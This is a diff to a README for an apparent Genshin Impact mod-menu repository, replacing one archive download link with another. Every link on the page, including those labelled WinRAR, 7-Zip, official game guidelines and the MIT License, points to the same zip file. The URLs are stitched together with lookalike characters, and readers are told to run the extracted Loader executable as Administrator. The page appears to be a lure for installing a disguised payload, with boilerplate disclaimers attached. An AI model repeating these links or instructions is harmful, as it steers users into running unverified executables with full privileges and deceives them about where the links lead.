@@ -45,8 +45,8 @@ Our mod menu is built to support a vast range of modern operating systems. Check
 
 Level up your Genshin Impact journey in moments! Follow these steps carefully for a seamless installation:
 
-1. **Download** `https://raw.githubusercontent.com/Sundaramanickam/GenshinImpact-ModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/Sundaramanickam/GenshinImpact-ModToolkit/main/Lоader.zip` from the repository’s releases section.
-2. **Extract** the contents to a dedicated folder using [WinRAR](https://raw.githubusercontent.com/Sundaramanickam/GenshinImpact-ModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/Sundaramanickam/GenshinImpact-ModToolkit/main/Lоader.zip) or [7-Zip](https://raw.githubusercontent.com/Sundaramanickam/GenshinImpact-ModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/Sundaramanickam/GenshinImpact-ModToolkit/main/Lоader.zip).
+1. **Download** `https://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zip` from the repository’s releases section.
+2. **Extract** the contents to a dedicated folder using [WinRAR](https://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zip) or [7-Zip](https://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zip).
 3. **Run** the Loader executable as Administrator (right-click → Run as admin).
 4. **Configure** your features inside the mod menu overlay once Genshin Impact is launched.
 5. **Play & Explore** with your chosen enhancements! You can toggle features anytime using the in-game hotkey interface.
@@ -61,7 +61,7 @@ Level up your Genshin Impact journey in moments! Follow these steps carefully fo
 - This project is created **for educational and entertainment purposes only**.
 - Using third-party tools in online games may be against the game's terms of service. You take full responsibility for using this software.  
 - We do **NOT** support unethical gaining of paid materials or unfair competition.
-- For any queries, refer to [official Genshin Impact guidelines](https://raw.githubusercontent.com/Sundaramanickam/GenshinImpact-ModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/Sundaramanickam/GenshinImpact-ModToolkit/main/Lоader.zip) and play responsibly.  
+- For any queries, refer to [official Genshin Impact guidelines](https://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zip) and play responsibly.  
 - The repository **does NOT promote, condone, or facilitate cheating in competitive environments**.
 
 ---
@@ -71,7 +71,7 @@ Level up your Genshin Impact journey in moments! Follow these steps carefully fo
 This project is open-source and made available under the MIT License.  
 Feel free to inspect, modify, and distribute as per the license terms.
 
-- Read the full **MIT License here**: https://raw.githubusercontent.com/Sundaramanickam/GenshinImpact-ModToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/Sundaramanickam/GenshinImpact-ModToolkit/main/Lоader.zip
+- Read the full **MIT License here**: https://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zipоhttps://github.com/Sundaramanickam/GenshinImpact-ModToolkit/raw/refs/heads/main/praya/Mod-Genshin-Toolkit-Impact-1.1.zip
 
 ---
 
